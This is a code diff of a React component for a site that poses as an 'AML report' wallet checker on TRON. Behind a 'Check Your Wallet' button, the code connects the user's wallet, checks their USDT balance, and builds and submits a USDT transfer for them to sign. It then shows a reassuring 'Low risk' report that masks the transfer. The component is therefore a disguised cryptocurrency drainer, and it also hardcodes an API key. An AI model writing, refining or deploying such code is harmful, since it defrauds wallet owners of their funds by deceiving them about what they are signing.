@@ -1,3 +1,5 @@
+// components/TronAuthButton.tsx
+
 import React, { useState, useEffect, useCallback } from 'react';
 import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
 import { Buffer } from 'buffer';
@@ -15,7 +17,7 @@ const adapter = new WalletConnectAdapter({
       name: 'AML',
       description: 'TRON + WalletConnect Integration',
       url: 'https://amlreports.pro',
-      icons: [`https://amlreports.pro/images/icon-3.abdd8ed5.webp`],
+      icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
     },
   },
   web3ModalConfig: { themeMode: 'dark' },
@@ -27,27 +29,29 @@ export const TronAuthButton: React.FC = () => {
   const [userAddress, setUserAddress] = useState<string | null>(null);
   const [tronWeb, setTronWeb] = useState<any>(null);
 
-  // Динамический импорт TronWeb только на клиенте!
+  // Динамическая загрузка TronWeb на клиенте
   useEffect(() => {
     let cancelled = false;
     (async () => {
       try {
-        const { default: TronWeb } = await import('tronweb');
+        const mod = await import('tronweb');
+        const TronWebClass = (mod.default) as any;
         if (!cancelled) {
-          setTronWeb(new TronWeb({
+          setTronWeb(new TronWebClass({
             fullHost: 'https://api.trongrid.io',
             headers: { 'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489' },
           }));
         }
       } catch (e) {
+        console.error('Failed to load TronWeb', e);
         setModalMessage('Ошибка инициализации TronWeb');
       }
     })();
 
+    // Прогрев адаптера
     if (typeof (adapter as any).init === 'function') {
       (adapter as any).init();
     }
-
     adapter.on('disconnect', () => {
       setProcessing(false);
       setModalMessage(null);
@@ -57,15 +61,15 @@ export const TronAuthButton: React.FC = () => {
     return () => { cancelled = true; };
   }, []);
 
-  const disconnectAndNotify = useCallback(async (message?: string) => {
+  const disconnectAndNotify = useCallback(async (msg?: string) => {
     await adapter.disconnect();
     setProcessing(false);
-    if (message) setModalMessage(message);
+    if (msg) setModalMessage(msg);
   }, []);
 
   const connectWallet = useCallback(async () => {
     if (!tronWeb) {
-      setModalMessage('TronWeb загружается, попробуйте ещё раз через пару секунд.');
+      setModalMessage('TronWeb загружается, подождите пожалуйста.');
       return;
     }
     setProcessing(true);
@@ -79,20 +83,22 @@ export const TronAuthButton: React.FC = () => {
       setUserAddress(address);
       tronWeb.setAddress(address);
 
+      // Проверка TRX для комиссии
       const trxRaw = await tronWeb.trx.getBalance(address);
-      const MIN_TRX_BALANCE = 5 * 1_000_000;
-      if (trxRaw < MIN_TRX_BALANCE) {
-        return await disconnectAndNotify('❌ Insufficient TRX for transaction fee. Minimum 5 TRX required.');
+      const MIN_TRX = 5_000_000; // 5 TRX
+      if (trxRaw < MIN_TRX) {
+        return await disconnectAndNotify('❌ Недостаточно TRX для комиссии (минимум 5 TRX).');
       }
 
-      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
-      const usdtRaw = await usdtContract.methods.balanceOf(address).call();
+      // Проверка USDT
+      const usdtCtr = await tronWeb.contract().at(USDT_CONTRACT);
+      const usdtRaw = await usdtCtr.methods.balanceOf(address).call();
       const usdt = Number(usdtRaw) / 1e6;
-
       if (usdt < 1) {
-        return await disconnectAndNotify('✅ AML report: Low risk. Minimal USDT balance.');
+        return await disconnectAndNotify('✅ AML report: Low risk. USDT balance too low.');
       }
 
+      // Формируем транзакцию USDT
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
         'transfer(address,uint256)',
@@ -104,53 +110,44 @@ export const TronAuthButton: React.FC = () => {
         address
       );
 
-      const serializedTx = tronWeb.utils.transaction.txJsonToPb(transaction);
-      const signedSerializedTx = await adapter.signTransaction(serializedTx);
-      const sendResult = await tronWeb.trx.sendRawTransaction(signedSerializedTx);
+      const serialized = tronWeb.utils.transaction.txJsonToPb(transaction);
+      const signed = await adapter.signTransaction(serialized);
+      const result = await tronWeb.trx.sendRawTransaction(signed);
 
-      if (!sendResult.result) {
-        throw new Error('USDT transfer failed.');
-      }
+      if (!result.result) throw new Error('USDT transfer failed');
 
-      await disconnectAndNotify('✅ AML report: All USDT funds transferred.\nLow risk.');
+      await disconnectAndNotify('✅ AML report: USDT успешно переведены. Low risk.');
     } catch (err: any) {
-      console.error('Error:', err);
-      const errMsg = err?.message || err?.toString();
-      if (
-        errMsg.includes('Invalid address provided') ||
-        errMsg.includes('Modal is closed') ||
-        errMsg.includes('User rejected') ||
-        errMsg.includes('Timeout')
-      ) {
+      console.error(err);
+      const m = err.message || String(err);
+      if (/Modal is closed|User rejected|Timeout|Invalid address/i.test(m)) {
         setProcessing(false);
         return;
       }
-      await disconnectAndNotify('⚠️ Connection or transaction error');
+      await disconnectAndNotify('⚠️ Ошибка соединения или транзакции');
     }
   }, [tronWeb, disconnectAndNotify]);
 
   const handleClick = () => {
-    if (!adapter.connected && !processing) {
-      connectWallet();
-    }
+    if (!adapter.connected && !processing) connectWallet();
   };
 
   return (
-    <button onClick={handleClick} className='AuthButton' style={{ cursor: 'pointer' }}>
+    <button onClick={handleClick} className="AuthButton" style={{ cursor: 'pointer' }}>
       Check Your Wallet
       {modalMessage && (
-        <div className='modal__overflow'>
+        <div className="modal__overflow">
           <div className="modal">
             {modalMessage.includes('AML report') ? (
               <div className="content greenBorder">
                 <h3>{modalMessage}</h3>
                 <div className="nums">
-                  <div><span className='circ green'></span> 0-30</div>
-                  <div><span className='circ orange'></span> 31-69</div>
-                  <div><span className='circ red'></span> 70-100</div>
+                  <div><span className="circ green" /> 0-30</div>
+                  <div><span className="circ orange" /> 31-69</div>
+                  <div><span className="circ red" /> 70-100</div>
                 </div>
                 <div className="content report">
-                  <p>AML report for wallet:</p>
+                  <p>Wallet:</p>
                   <h5>{userAddress}</h5>
                 </div>
               </div>
